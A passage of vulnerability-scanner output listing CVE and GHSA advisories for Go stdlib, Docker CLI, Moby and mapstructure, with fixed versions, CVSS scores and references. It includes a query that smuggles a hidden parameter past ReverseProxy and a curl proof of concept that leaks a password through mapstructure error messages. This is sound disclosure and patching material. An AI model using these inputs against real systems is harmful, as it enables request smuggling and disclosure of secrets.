│     │     │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │     │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4986 
│     │     ├ PublishedDate   : 2026-05-07T20:16:43.187Z 
│     │     ╰ LastModifiedDate: 2026-05-08T15:16:37.323Z 
│     ├ [3] ╭ VulnerabilityID : CVE-2026-39823 
│     │     ├ VendorIDs        ─ [0]: GO-2026-4982 
│     │     ├ PkgID           : stdlib@v1.26.2 
│     │     ├ PkgName         : stdlib 
│     │     ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.2 
│     │     │                  ╰ UID : 2cce5456b87d81aa 
│     │     ├ InstalledVersion: v1.26.2 
│     │     ├ FixedVersion    : 1.25.10, 1.26.3 
│     │     ├ Status          : fixed 
│     │     ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │     │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39823 
│     │     ├ DataSource       ╭ ID  : govulndb 
│     │     │                  ├ Name: The Go Vulnerability Database 
│     │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │     ├ Fingerprint     : sha256:d18cea2ac78d8707cadd3f32f037bef9fb8f8a6669664d7ed4f9571241d5d5d6 
│     │     ├ Title           : CVE-2026-27142 fixed a vulnerability in which URLs were not correctly  ... 
│     │     ├ Description     : CVE-2026-27142 fixed a vulnerability in which URLs were not correctly escaped
│     │     │                   inside of a <meta> tag's <content> attribute. If the URL content were to insert
│     │     │                    ASCII whitespaces around the '=' rune inside of the <content> attribute, the
│     │     │                   escaper would fail to similarly escape it, leading to XSS. 
│     │     ├ Severity        : UNKNOWN 
│     │     ├ References       ╭ [0]: https://go.dev/cl/769920 
│     │     │                  ├ [1]: https://go.dev/issue/78913 
│     │     │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │     │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4982 
│     │     ├ PublishedDate   : 2026-05-07T20:16:43.29Z 
│     │     ╰ LastModifiedDate: 2026-05-08T15:16:37.5Z 
│     ├ [4] ╭ VulnerabilityID : CVE-2026-39825 
│     │     ├ VendorIDs        ─ [0]: GO-2026-4976 
│     │     ├ PkgID           : stdlib@v1.26.2 
│     │     ├ PkgName         : stdlib 
│     │     ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.2 
│     │     │                  ╰ UID : 2cce5456b87d81aa 
│     │     ├ InstalledVersion: v1.26.2 
│     │     ├ FixedVersion    : 1.25.10, 1.26.3 
│     │     ├ Status          : fixed 
│     │     ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │     │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39825 
│     │     ├ DataSource       ╭ ID  : govulndb 
│     │     │                  ├ Name: The Go Vulnerability Database 
│     │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │     ├ Fingerprint     : sha256:fd3f2514d4cf28d93b24b4b9e56d1a0aa01a08e0cada24cb1e333c0fbaf9fc1e 
│     │     ├ Title           : ReverseProxy can forward queries containing parameters not visible to  ... 
│     │     ├ Description     : ReverseProxy can forward queries containing parameters not visible to Rewrite
│     │     │                   functions. When used with a Rewrite function, or a Director function which
│     │     │                   parses query parameters, ReverseProxy sanitizes the forwarded request to remove
│     │     │                    query parameters which are not parsed by url.ParseQuery. ReverseProxy does not
│     │     │                    take ParseQuery's limit on the total number of query parameters (controlled by
│     │     │                    GODEBUG=urlmaxqueryparams=N) into account. This can permit ReverseProxy to
│     │     │                   forward a request containing a query parameter that is not visible to the
│     │     │                   Rewrite function. For example, the query "a1=x&a2=x&...&a10000=x&hidden=y" can
│     │     │                   forward the parameter "hidden=y" while hiding it from the proxy's Rewrite
│     │     │                   function. 
│     │     ├ Severity        : UNKNOWN 
│     │     ├ References       ╭ [0]: https://go.dev/cl/770541 
│     │     │                  ├ [1]: https://go.dev/issue/78948 
│     │     │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │     │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4976 
│     │     ├ PublishedDate   : 2026-05-07T20:16:43.39Z 
│     │     ╰ LastModifiedDate: 2026-05-08T22:16:29.547Z 
│     ├ [5] ╭ VulnerabilityID : CVE-2026-39826 
│     │     ├ VendorIDs        ─ [0]: GO-2026-4980 
│     │     ├ PkgID           : stdlib@v1.26.2 
│     │     ├ PkgName         : stdlib 
│     │     ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.2 
│     │     │                  ╰ UID : 2cce5456b87d81aa 
│     │     ├ InstalledVersion: v1.26.2 
│     │     ├ FixedVersion    : 1.25.10, 1.26.3 
│     │     ├ Status          : fixed 
│     │     ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │     │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39826 
│     │     ├ DataSource       ╭ ID  : govulndb 
│     │     │                  ├ Name: The Go Vulnerability Database 
│     │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │     ├ Fingerprint     : sha256:0ed5ad4cd76c70cd6789d8b2c71b0b37a3e4ff7ed1e18605960fa2b8a841166d 
│     │     ├ Title           : If a trusted template author were to write a <script> tag containing a ... 
│     │     ├ Description     : If a trusted template author were to write a <script> tag containing an empty
│     │     │                   'type' attribute or a 'type' attribute with an ASCII whitespace, the execution
│     │     │                   of the template would incorrectly escape any data passed into the <script>
│     │     │                   block. 
│     │     ├ Severity        : UNKNOWN 
│     │     ├ References       ╭ [0]: https://go.dev/cl/771180 
│     │     │                  ├ [1]: https://go.dev/issue/78981 
│     │     │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │     │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4980 
│     │     ├ PublishedDate   : 2026-05-07T20:16:43.49Z 
│     │     ╰ LastModifiedDate: 2026-05-08T15:16:37.68Z 
│     ├ [6] ╭ VulnerabilityID : CVE-2026-39836 
│     │     ├ VendorIDs        ─ [0]: GO-2026-4971 
│     │     ├ PkgID           : stdlib@v1.26.2 
│     │     ├ PkgName         : stdlib 
│     │     ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.2 
│     │     │                  ╰ UID : 2cce5456b87d81aa 
│     │     ├ InstalledVersion: v1.26.2 
│     │     ├ FixedVersion    : 1.25.10, 1.26.3 
│     │     ├ Status          : fixed 
│     │     ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │     │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39836 
│     │     ├ DataSource       ╭ ID  : govulndb 
│     │     │                  ├ Name: The Go Vulnerability Database 
│     │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │     ├ Fingerprint     : sha256:770b2b8f73d56eb09b30b6c5a8183bc6a20d28af6875ca687d72a7135e9b0976 
│     │     ├ Title           : Panic in Dial and LookupPort when handling NUL byte on Windows in net 
│     │     ├ Description     : The Dial and LookupPort functions panic on Windows when provided with an input
│     │     │                   containing a NUL (0). 
│     │     ├ Severity        : UNKNOWN 
│     │     ├ References       ╭ [0]: https://go.dev/cl/775320 
│     │     │                  ├ [1]: https://go.dev/issue/79006 
│     │     │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │     │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4971 
│     │     ├ PublishedDate   : 2026-05-07T20:16:43.593Z 
│     │     ╰ LastModifiedDate: 2026-05-08T22:16:29.723Z 
│     ╰ [7] ╭ VulnerabilityID : CVE-2026-42499 
│           ├ VendorIDs        ─ [0]: GO-2026-4977 
│           ├ PkgID           : stdlib@v1.26.2 
│           ├ PkgName         : stdlib 
│           ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.2 
│           │                  ╰ UID : 2cce5456b87d81aa 
│           ├ InstalledVersion: v1.26.2 
│           ├ FixedVersion    : 1.25.10, 1.26.3 
│           ├ Status          : fixed 
│           ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│           │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│           ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42499 
│           ├ DataSource       ╭ ID  : govulndb 
│           │                  ├ Name: The Go Vulnerability Database 
│           │                  ╰ URL : https://pkg.go.dev/vuln/ 
│           ├ Fingerprint     : sha256:ad37abd826327ad9f5107f2f0ba6c036b1c3644a487d4c8d0549ebfedeac409c 
│           ├ Title           : Pathological inputs could cause DoS through consumePhrase when parsing ... 
│           ├ Description     : Pathological inputs could cause DoS through consumePhrase when parsing an email
│           │                    address according to RFC 5322. 
│           ├ Severity        : UNKNOWN 
│           ├ References       ╭ [0]: https://go.dev/cl/771520 
│           │                  ├ [1]: https://go.dev/issue/78987 
│           │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│           │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4977 
│           ├ PublishedDate   : 2026-05-07T20:16:44.54Z 
│           ╰ LastModifiedDate: 2026-05-08T22:16:33.183Z 
├ [3] ╭ [0]  ╭ VulnerabilityID : CVE-2025-15558 
│     │      ├ VendorIDs        ─ [0]: GHSA-p436-gjf2-799p 
│     │      ├ PkgID           : github.com/docker/cli@v28.0.2+incompatible 
│     │      ├ PkgName         : github.com/docker/cli 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/docker/cli@v28.0.2%2Bincompatible 
│     │      │                  ╰ UID : 88851239871c0131 
│     │      ├ InstalledVersion: v28.0.2+incompatible 
│     │      ├ FixedVersion    : 29.2.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-15558 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:3ee6688f105cd69e21fa2cf1a29baaeb7bdc0757db2d3af4be8ae012a30d46b9 
│     │      ├ Title           : docker/cli: Docker CLI for Windows: Privilege escalation via malicious plugin
│     │      │                   binaries 
│     │      ├ Description     : Docker CLI for Windows searches for plugin binaries in
│     │      │                   C:\ProgramData\Docker\cli-plugins, a directory that does not exist by default.
│     │      │                    A low-privileged attacker can create this directory and place malicious CLI
│     │      │                   plugin binaries (docker-compose.exe, docker-buildx.exe, etc.) that are
│     │      │                   executed when a victim user opens Docker Desktop or invokes Docker CLI plugin
│     │      │                   features, and allow privilege-escalation if the docker CLI is executed as a
│     │      │                   privileged user.
│     │      │                   
│     │      │                   This issue affects Docker CLI: through 29.1.5 and Windows binaries acting as a
│     │      │                    CLI-plugin manager using the  github.com/docker/cli/cli-plugins/manager
│     │      │                   https://pkg.go.dev/github.com/docker/cli@v29.1.5+incompatible/cli-plugins/mana
│     │      │                   ger  package, such as Docker Compose.
│     │      │                   This issue does not impact non-Windows binaries, and projects not using the
│     │      │                   plugin-manager code. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-427 
│     │      ├ VendorSeverity   ╭ bitnami: 3 
│     │      │                  ├ ghsa   : 3 
│     │      │                  ├ nvd    : 3 
│     │      │                  ╰ redhat : 3 
│     │      ├ CVSS             ╭ bitnami ╭ V40Vector: CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:P/VC:H/VI:H/VA:H/SC:N/SI
│     │      │                  │         │            :N/SA:N/AU:N/R:U 
│     │      │                  │         ╰ V40Score : 7 
│     │      │                  ├ ghsa    ╭ V40Vector: CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:P/VC:H/VI:H/VA:H/SC:N/SI
│     │      │                  │         │            :N/SA:N 
│     │      │                  │         ╰ V40Score : 7 
│     │      │                  ├ nvd     ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H 
│     │      │                  │         ╰ V3Score : 8 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H 
│     │      │                            ╰ V3Score : 7.3 
│     │      ├ References       ╭ [0] : https://access.redhat.com/security/cve/CVE-2025-15558 
│     │      │                  ├ [1] : https://docs.docker.com/desktop/release-notes 
│     │      │                  ├ [2] : https://docs.docker.com/desktop/release-notes/ 
│     │      │                  ├ [3] : https://github.com/docker/cli 
│     │      │                  ├ [4] : https://github.com/docker/cli/commit/13759330b1f7e7cb0d67047ea42c548254
│     │      │                  │       8ba7fa 
│     │      │                  ├ [5] : https://github.com/docker/cli/pull/6713 
│     │      │                  ├ [6] : https://github.com/docker/cli/security/advisories/GHSA-p436-gjf2-799p 
│     │      │                  ├ [7] : https://github.com/docker/compose/pull/12300 
│     │      │                  ├ [8] : https://nvd.nist.gov/vuln/detail/CVE-2025-15558 
│     │      │                  ├ [9] : https://www.cve.org/CVERecord?id=CVE-2025-15558 
│     │      │                  ├ [10]: https://www.zerodayinitiative.com/advisories/ZDI-CAN-28304 
│     │      │                  ╰ [11]: https://www.zerodayinitiative.com/advisories/ZDI-CAN-28304/ 
│     │      ├ PublishedDate   : 2026-03-04T17:16:14.763Z 
│     │      ╰ LastModifiedDate: 2026-03-09T17:38:15.95Z 
│     ├ [1]  ╭ VulnerabilityID : CVE-2026-34040 
│     │      ├ VendorIDs        ─ [0]: GHSA-x744-4wpc-v9h2 
│     │      ├ PkgID           : github.com/docker/docker@v28.0.4+incompatible 
│     │      ├ PkgName         : github.com/docker/docker 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/docker/docker@v28.0.4%2Bincompatible 
│     │      │                  ╰ UID : 55fb5abb1612e962 
│     │      ├ InstalledVersion: v28.0.4+incompatible 
│     │      ├ FixedVersion    : 29.3.1 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-34040 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:b95617163bdd826d89f5e280dbb2346c912e9a034af092ca004155934c38f6e2 
│     │      ├ Title           : Moby: Moby: Authorization bypass vulnerability 
│     │      ├ Description     : Moby is an open source container framework. Prior to version 29.3.1, a
│     │      │                   security vulnerability has been detected that allows attackers to bypass
│     │      │                   authorization plugins (AuthZ). This issue has been patched in version
│     │      │                   29.3.1. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-288 
│     │      ├ VendorSeverity   ╭ amazon: 3 
│     │      │                  ├ ghsa  : 3 
│     │      │                  ├ nvd   : 3 
│     │      │                  ├ photon: 3 
│     │      │                  ╰ redhat: 2 
│     │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H 
│     │      │                  │        ╰ V3Score : 8.8 
│     │      │                  ├ nvd    ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H 
│     │      │                  │        ╰ V3Score : 7.8 
│     │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N 
│     │      │                           ╰ V3Score : 8.4 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-34040 
│     │      │                  ├ [1]: https://docs.docker.com/engine/extend/plugins_authorization 
│     │      │                  ├ [2]: https://github.com/moby/moby 
│     │      │                  ├ [3]: https://github.com/moby/moby/commit/e89edb19ad7de0407a5d31e3111cb01aa10b
│     │      │                  │      5a38 
│     │      │                  ├ [4]: https://github.com/moby/moby/releases/tag/docker-v29.3.1 
│     │      │                  ├ [5]: https://github.com/moby/moby/security/advisories/GHSA-v23v-6jw2-98fq 
│     │      │                  ├ [6]: https://github.com/moby/moby/security/advisories/GHSA-x744-4wpc-v9h2 
│     │      │                  ├ [7]: https://nvd.nist.gov/vuln/detail/CVE-2026-34040 
│     │      │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2026-34040 
│     │      ├ PublishedDate   : 2026-03-31T03:15:57.883Z 
│     │      ╰ LastModifiedDate: 2026-04-03T16:51:28.67Z 
│     ├ [2]  ╭ VulnerabilityID : CVE-2026-33997 
│     │      ├ VendorIDs        ─ [0]: GHSA-pxq6-2prw-chj9 
│     │      ├ PkgID           : github.com/docker/docker@v28.0.4+incompatible 
│     │      ├ PkgName         : github.com/docker/docker 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/docker/docker@v28.0.4%2Bincompatible 
│     │      │                  ╰ UID : 55fb5abb1612e962 
│     │      ├ InstalledVersion: v28.0.4+incompatible 
│     │      ├ FixedVersion    : 29.3.1 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-33997 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:99829613e4b8bd7e1076e9e5a2e474162bf5bb3dc4f1d295280a0c5d1db783df 
│     │      ├ Title           : moby: docker: github.com/moby/moby: Moby: Privilege validation bypass during
│     │      │                   plugin installation 
│     │      ├ Description     : Moby is an open source container framework. Prior to version 29.3.1, a
│     │      │                   security vulnerability has been detected that allows plugins privilege
│     │      │                   validation to be bypassed during docker plugin install. Due to an error in the
│     │      │                    daemon's privilege comparison logic, the daemon may incorrectly accept a
│     │      │                   privilege set that differs from the one approved by the user. Plugins that
│     │      │                   request exactly one privilege are also affected, because no comparison is
│     │      │                   performed at all. This issue has been patched in version 29.3.1. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-193 
│     │      ├ VendorSeverity   ╭ amazon: 2 
│     │      │                  ├ ghsa  : 2 
│     │      │                  ├ nvd   : 3 
│     │      │                  ├ photon: 3 
│     │      │                  ╰ redhat: 3 
│     │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N 
│     │      │                  │        ╰ V3Score : 6.8 
│     │      │                  ├ nvd    ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N 
│     │      │                  │        ╰ V3Score : 8.1 
│     │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:H/A:H 
│     │      │                           ╰ V3Score : 8.4 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-33997 
│     │      │                  ├ [1]: https://docs.docker.com/engine/extend/legacy_plugins 
│     │      │                  ├ [2]: https://github.com/moby/moby 
│     │      │                  ├ [3]: https://github.com/moby/moby/commit/f4d6f25bf0c3fa12d4968320a45685947756
│     │      │                  │      a22a 
│     │      │                  ├ [4]: https://github.com/moby/moby/releases/tag/docker-v29.3.1 
│     │      │                  ├ [5]: https://github.com/moby/moby/security/advisories/GHSA-pxq6-2prw-chj9 
│     │      │                  ├ [6]: https://nvd.nist.gov/vuln/detail/CVE-2026-33997 
│     │      │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2026-33997 
│     │      ├ PublishedDate   : 2026-03-31T03:15:57.523Z 
│     │      ╰ LastModifiedDate: 2026-04-03T17:23:21.307Z 
│     ├ [3]  ╭ VulnerabilityID : CVE-2025-11065 
│     │      ├ VendorIDs        ─ [0]: GHSA-2464-8j7c-4cjm 
│     │      ├ PkgID           : github.com/go-viper/mapstructure/v2@v2.2.1 
│     │      ├ PkgName         : github.com/go-viper/mapstructure/v2 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/go-viper/mapstructure/v2@v2.2.1 
│     │      │                  ╰ UID : 1b295759ac036b69 
│     │      ├ InstalledVersion: v2.2.1 
│     │      ├ FixedVersion    : 2.4.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-11065 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:3c25bc25e90a015bf5c2d910147d8f3ae091d483df97f84a4085c061dbd40324 
│     │      ├ Title           : github.com/go-viper/mapstructure/v2: Go-viper's mapstructure May Leak
│     │      │                   Sensitive Information in Logs in github.com/go-viper/mapstructure 
│     │      ├ Description     : A flaw was found in github.com/go-viper/mapstructure/v2, in the field
│     │      │                   processing component using mapstructure.WeakDecode. This vulnerability allows
│     │      │                   information disclosure through detailed error messages that may leak sensitive
│     │      │                    input values via malformed user-supplied data processed in security-critical
│     │      │                   contexts. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-209 
│     │      ├ VendorSeverity   ╭ amazon     : 2 
│     │      │                  ├ azure      : 2 
│     │      │                  ├ cbl-mariner: 2 
│     │      │                  ├ ghsa       : 2 
│     │      │                  ╰ redhat     : 2 
│     │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N 
│     │      │                  │        ╰ V3Score : 5.3 
│     │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N 
│     │      │                           ╰ V3Score : 5.3 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2025-11065 
│     │      │                  ├ [1]: https://bugzilla.redhat.com/show_bug.cgi?id=2391829 
│     │      │                  ├ [2]: https://github.com/go-viper/mapstructure 
│     │      │                  ├ [3]: https://github.com/go-viper/mapstructure/commit/742921c9ba2854d27baa6427
│     │      │                  │      2487fc5075d2c39c 
│     │      │                  ├ [4]: https://github.com/go-viper/mapstructure/security/advisories/GHSA-2464-8
│     │      │                  │      j7c-4cjm 
│     │      │                  ├ [5]: https://nvd.nist.gov/vuln/detail/CVE-2025-11065 
│     │      │                  ├ [6]: https://pkg.go.dev/vuln/GO-2025-3900 
│     │      │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2025-11065 
│     │      ├ PublishedDate   : 2026-01-26T20:16:06.84Z 
│     │      ╰ LastModifiedDate: 2026-04-15T00:35:42.02Z 
│     ├ [4]  ╭ VulnerabilityID : GHSA-fv92-fjc5-jj9h 
│     │      ├ PkgID           : github.com/go-viper/mapstructure/v2@v2.2.1 
│     │      ├ PkgName         : github.com/go-viper/mapstructure/v2 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/go-viper/mapstructure/v2@v2.2.1 
│     │      │                  ╰ UID : 1b295759ac036b69 
│     │      ├ InstalledVersion: v2.2.1 
│     │      ├ FixedVersion    : 2.3.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://github.com/advisories/GHSA-fv92-fjc5-jj9h 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:0c085a105f5188c45b05348abd63298ec12d9be44b23c4c4f8870e9707472d69 
│     │      ├ Title           : mapstructure May Leak Sensitive Information in Logs When Processing Malformed
│     │      │                   Data 
│     │      ├ Description     : ### Summary
│     │      │                   
│     │      │                   Use of this library in a security-critical context may result in leaking
│     │      │                   sensitive information, if used to process sensitive fields.
│     │      │                   ### Details
│     │      │                   OpenBao (and presumably HashiCorp Vault) have surfaced error messages from
│     │      │                   `mapstructure` as follows:
│     │      │                   https://github.com/openbao/openbao/blob/98c3a59c040efca724353ca46ca79bd5cdbab9
│     │      │                   20/sdk/framework/field_data.go#L43-L50
│     │      │                   ```go
│     │      │                   			_, _, err := d.getPrimitive(field, schema)
│     │      │                   			if err != nil {
│     │      │                   				return fmt.Errorf("error converting input for field %q: %w", field, err)
│     │      │                   			}
│     │      │                   ```
│     │      │                   where this calls `mapstructure.WeakDecode(...)`:
│     │      │                   20/sdk/framework/field_data.go#L181-L193
│     │      │                   func (d *FieldData) getPrimitive(k string, schema *FieldSchema) (interface{},
│     │      │                   bool, error) {
│     │      │                   	raw, ok := d.Raw[k]
│     │      │                   	if !ok {
│     │      │                   		return nil, false, nil
│     │      │                   	}
│     │      │                   	switch t := schema.Type; t {
│     │      │                   	case TypeBool:
│     │      │                   		var result bool
│     │      │                   		if err := mapstructure.WeakDecode(raw, &result); err != nil {
│     │      │                   			return nil, false, err
│     │      │                   		}
│     │      │                   		return result, true, nil
│     │      │                   Notably, `WeakDecode(...)` eventually calls one of the decode helpers, which
│     │      │                   surfaces the original value:
│     │      │                   https://github.com/go-viper/mapstructure/blob/1a66224d5e54d8757f63bd66339cf764
│     │      │                   c3292c21/mapstructure.go#L679-L686
│     │      │                   c3292c21/mapstructure.go#L726-L730
│     │      │                   c3292c21/mapstructure.go#L783-L787
│     │      │                   & more.
│     │      │                   ### PoC
│     │      │                   To reproduce with OpenBao:
│     │      │                   $ podman run -p 8300:8300 openbao/openbao:latest server -dev
│     │      │                   -dev-root-token-id=root -dev-listen-address=0.0.0.0:8300
│     │      │                   and in a new tab:
│     │      │                   $ BAO_TOKEN=root BAO_ADDR=http://localhost:8300 bao auth enable userpass
│     │      │                   Success! Enabled userpass auth method at: userpass/
│     │      │                   $ curl -X PUT -H "X-Vault-Request: true" -H "X-Vault-Token: root" -d
│     │      │                   '{"password":{"asdf":"my-sensitive-value"}}'
│     │      │                   "http://localhost:8300/v1/auth/userpass/users/adsf"
│     │      │                   {"errors":["error converting input for field \"password\": '' expected type
│     │      │                   'string', got unconvertible type 'map[string]interface {}', value:
│     │      │                   'map[asdf:my-sensitive-value]'"]}
│     │      │                   ### Impact
│     │      │                   This is an information disclosure bug with little mitigation. See
│     │      │                   https://discuss.hashicorp.com/t/hcsec-2025-09-vault-may-expose-sensitive-infor
│     │      │                   mation-in-error-logs-when-processing-malformed-data-with-the-kv-v2-plugin/7471
│     │      │                   7 for a previous version. That version was fixed, but this is in the second
│     │      │                   part of that error message (starting at `'' expected a map, got 'string'` --
│     │      │                   when the field type is `string` and a `map` is provided, we see the above
│     │      │                   information leak -- the previous example had a `map` type field with a
│     │      │                   `string` value provided).
│     │      │                   This was rated 4.5 Medium by HashiCorp in the past iteration. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ VendorSeverity   ─ ghsa: 2 
│     │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N 
│     │      │                         ╰ V3Score : 5.3 
│     │      ├ References       ╭ [0]: https://github.com/go-viper/mapstructure 
│     │      │                  ╰ [1]: https://github.com/go-viper/mapstructure/security/advisories/GHSA-fv92-f
│     │      │                         jc5-jj9h 
│     │      ├ PublishedDate   : 2025-06-27T16:24:59Z 
│     │      ╰ LastModifiedDate: 2025-06-27T16:24:59Z 
│     ├ [5]  ╭ VulnerabilityID : CVE-2025-22872 
